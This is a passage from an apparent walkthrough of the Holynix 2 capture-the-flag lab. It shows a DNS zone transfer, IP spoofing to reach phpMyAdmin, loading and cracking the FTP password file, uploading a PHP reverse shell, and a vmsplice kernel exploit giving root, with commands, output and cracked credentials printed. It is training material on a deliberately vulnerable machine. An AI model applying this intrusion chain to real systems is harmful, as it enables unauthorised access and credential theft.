+mta.zincftp.com. 38400 IN A 10.0.192.48
+ncobol.zincftp.com. 38400 IN A 192.168.1.88
+ns1.zincftp.com. 38400 IN A 192.168.1.88
+ns2.zincftp.com. 38400 IN A 192.168.1.89
+rcropper.zincftp.com. 38400 IN A 192.168.1.88
+rfrost.zincftp.com. 38400 IN A 192.168.1.88
+rwoo.zincftp.com. 38400 IN A 192.168.1.88
+skrymple.zincftp.com. 38400 IN A 192.168.1.88
+splath.zincftp.com. 38400 IN A 192.168.1.88
+tmartin.zincftp.com. 38400 IN A 192.168.1.88
+trusted.zincftp.com. 38400 IN A 192.168.1.34
+www.zincftp.com. 38400 IN A 192.168.1.88
+zincftp.com.  38400 IN SOA ns1.zincftp.com. ns2.zincftp.com. 2006071801 28800 3600 604800 38400
+;; Query time: 9 msec
+;; SERVER: 192.168.1.88#53(192.168.1.88)
+;; WHEN: Sun Apr  8 18:15:03 2012
+;; XFR size: 42 records (messages 1, bytes 1021)
+
+Excellent! Now I had obtained a list of usernames, including a couple of other interesting subdomains: mta.zincftp.com (mail server?) and trusted.zincftp.com
+
+In order to access each user's site, I had to update /etc/resolv.conf and add 192.168.1.88 as the primary nameserver. I spent the next few minutes exploring each user's page. Many had nothing on their site, others had music files, videos, and pictures. I found one interesting file, which was a resume for user ddonnovan that identified him as the network administrator of the system. This meant that he might have access to higher privileges that would eventually lead to root access.
+
+I went back to DirBuster to see if it had found any hidden directories. Sure enough, a few interesting ones were discovered:
+
+
+server-status, phpMyAdmin, and setup_guides. Attempting to access these directories resulted in 403 Forbidden errors. I remembered that there was a site called trusted.zincftp.com with IP address 192.168.1.34. I thought that if I used that IP address, I might have special access to these directories. Sure enough, after changing my IP address to 192.168.1.34, I was able to access phpMyAdmin and setup_guides, but not server-status.
+
+The setup_guides directory had a todo file that contained instructions on how to add a new FTP user. This proved to be valuable information because it contained the location of the FTP user password file, /etc/pure-ftpd/pureftpd.passwd
+
+Next was the phpMyAdmin directory. This brought me to the phpMyAdmin interface which allowed me to explore the contents of the zincftp_data directory. This database contained only one table user_requests which contained usernames and email addresses of people who submitted a registration on the front page. I checked to see what kind of privileges I had, and it looked like I could create tables and insert data. I decided to try to load the contents of /etc/pure-ftpd/pureftpd.passwd to a table. I started by creating a new table called ftp_passwords with one VARCHAR(100) field called password.
+
+Next I clicked on the SQL tab and entered the following to load the contents of purftpd.passwd into the ftp_passwords table:
+
+
+phpMyAdmin replied with "Inserted rows: 31". I checked the contents of ftp_passwords and it contained usernames and encrypted passwords:
+
+
+I exported these into a text file and cleaned up the quotes around the strings. I passed these to john for cracking using a wordlist I obtained from http://contest-2010.korelogic.com/wordlists.html. If I could get one login, I might be able to SSH or FTP into the server.
+
+
+# /pentest/passwords/john/john --wordlist=/wordlists/rockyou.txt ftppass
+
+After a while, three passwords were cracked:
+
+
+cbergey:chatterbox1:1031:2002::/home/cbergey/./::::::::::::
+tmartin:millionaire:1031:2002::/home/tmartin/./::::::::::::
+ahuxley:bravenewworld:1031:2002::/home/ahuxley/./::::::::::::
+
+It was time to try logging in.
+
+
+# ssh ahuxley@192.168.1.88
+ahuxley@192.168.1.88's password:
+Permission denied, please try again.
+ahuxley@192.168.1.88's password:
+Permission denied, please try again.
+ahuxley@192.168.1.88's password:
+
+SSH didn't work, but FTP proved to be more rewarding. I was able to FTP in as ahuxley, and knowing that I could read files and thus launch PHP files once I'd uploaded them into the FTP server, I would be able to launch a PHP reverse shell and gain shell access into the server:
+
+
+# ftp 192.168.1.88
+Connected to 192.168.1.88.
+220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
+220-You are user number 1 of 5 allowed.
+220-Local time is now 05:36. Server port: 21.
+220-This is a private system - No anonymous login
+220-IPv6 connections are also welcome on this server.
+220 You will be disconnected after 15 minutes of inactivity.
+Name (192.168.1.88:root): ahuxley
+331 User ahuxley OK. Password required
+Password:
+230-User ahuxley has group access to:  2002   
+230 OK. Current directory is /
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> dir
+200 PORT command successful
+150 Connecting to port 44379
+drwxr-xr-x    2 1031     2002         4096 Apr  7 12:36 web
+226-Options: -l
+226 1 matches total
+ftp> cd web
+250 OK. Current directory is /web
+ftp> put rshell.php
+local: rshell.php remote: rshell.php
+200 PORT command successful
+150 Connecting to port 54359
+226-File successfully transferred
+226 0.014 seconds (measured here), 379.54 Kbytes per second
+5494 bytes sent in 0.00 secs (10882.8 kB/s)
+ftp> chmod 0755 rshell.php
+200 Permissions changed on rshell.php
+ftp>
+
+You can get a PHP reverse shell from anywhere, I got mine from http://pentestmonkey.net/tools/web-shells/php-reverse-shell. I configured my reverse shell to connect to port 9998, so I fired up nc to listen to that port. Once nc was running, I headed over to http://ahuxley.zincftp.com/rshell.php and got my reverse shell on nc:
+
+
+# nc -lvp 9998
+listening on [any] 9998 ...
+192.168.1.88: inverse host lookup failed: Unknown server error : Connection timed out
+connect to [192.168.1.34] from (UNKNOWN) [192.168.1.88] 60455
+Linux holynix2 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686 GNU/Linux
+ 05:43:19 up 1 day,  6:34,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: can't access tty; job control turned off
+$
+
+I was logged in as www-data, and there were no sudo privileges setup for this user account. I checked the contents of /etc/passwd and found only a few users had shell access to the system:
+
+
+lsanderson:x:1000:114:Lyle Sanderson:/home/lsanderson:/bin/bash
+cfinnerly:x:1001:100:Chuck Finnerly:/home/cfinnerly:/bin/bash
+ddonnovan:x:1002:100:David Donnovan:/home/ddonnovan:/bin/bash
+skrymple:x:1003:100:Shelly Krymple:/home/skrymple:/bin/bash
+amckinley:x:1004:100:Agustin Mckinley:/home/amckinley:/bin/bash
+
+Unfortunately I hadn't cracked any of those user's passwords yet. I checked /var/mail but it was empty. I found a directory called /var/www/dev which contained a PHP file that listed the MySQL password for the root user.
+
+
+ $db_host = 'localhost';
+ $db_user = 'root';
+ $db_pass = 'dynamo59956783';
+ $db_name = '_zincftp_data';
+ $conn = mysql_connect($db_host, $db_user, $db_pass) or die("Unable to connect to MySQL");
+ mysql_select_db($db_name,$conn) or die("Could not select Database");
+
+I tried to SSH to the server again as root with this password, but the attempt failed. /var/www/htdocs contained a similar file, except the database credentials were for phpMyAdmin.
+
+I checked out the processes that were running, looked at the crontab files, and looked for any interesting files that might elevate my current privileges. I found several image files and a couple of RAR files that were password protected. I used crark to try to crack the passwords for the RAR files, but that proved fruitless. I checked the image files for any hidden messages using stegdetect but came up empty.
+
+I started looking for local exploits, and started off with local kernel exploits. The server was running on 2.6.22-14. Using Google, I found references to a vmsplice local root exploit. I checked exploit-db and found them:
+
+
+# ./searchsploit vmsplice
+ Description                                                                 Path
+--------------------------------------------------------------------------- -------------------------
+Linux Kernel 2.6.17 - 2.6.24.1 vmsplice Local Root Exploit                  /linux/local/5092.c
+Linux Kernel 2.6.17 - 2.6.24.1 vmsplice Local Root Exploit                  /linux/local/5092.c
+Linux Kernel 2.6.17 - 2.6.24.1 vmsplice Local Root Exploit                  /linux/local/5092.c
+Linux Kernel 2.6.23 - 2.6.24 vmsplice Local Root Exploit                    /linux/local/5093.c
+Linux Kernel 2.6.23 - 2.6.24 vmsplice Local Root Exploit                    /linux/local/5093.c
+Linux Kernel 2.6.23 - 2.6.24 vmsplice Local Root Exploit                    /linux/local/5093.c
+
+I transferred 5092.c and 5093.c to ahuxley's home directory via FTP, then using www-data, copied them over to /tmp. I decided to copy both over because in some cases one exploit will fail while another will work right off the bat, so better to just have them all ready to go.
+
+I compiled 5092.c and ran the executable and got a root shell instantly! The game was over, the server had been successfully compromised.
+
+
+$ cp /home/ahuxley/web/*.c .
+$ ls -latr
+total 20
+drwxr-xr-x 21 root     root     4096 Dec  5  2010 ..
+-rw-r--r--  1 www-data www-data 2883 Apr  7 15:43 5093.c
+-rw-r--r--  1 www-data www-data 6293 Apr  7 15:43 5092.c
+drwxrwxrwt  2 root     root     4096 Apr  7 15:43 .
+$ ls -l
+total 12
+-rw-r--r-- 1 www-data www-data 6293 Apr  7 15:43 5092.c
+-rw-r--r-- 1 www-data www-data 2883 Apr  7 15:43 5093.c
+$ gcc -o 5092 5092.c
+$ ./5092
+bash: no job control in this shell
+root@holynix2:/tmp# id
+uid=0(root) gid=0(root) groups=33(www-data)
+
+This was an interesting exercise, a bit different from the past few ones that I've completed, with the DNS zone transfer trick and switching IP addresses around. It's the last of the Holynix challenges, but there are other challenges to come. Definitely a great way to keep those creative brain juices flowing.
+
+ https://docs.google.com/document/d/1hphVvRlrrFF7hOjHyj4LMQhFG-amUg_P/edit?usp=share_link&ouid=101981733486971118026&rtpof=true&sd=true
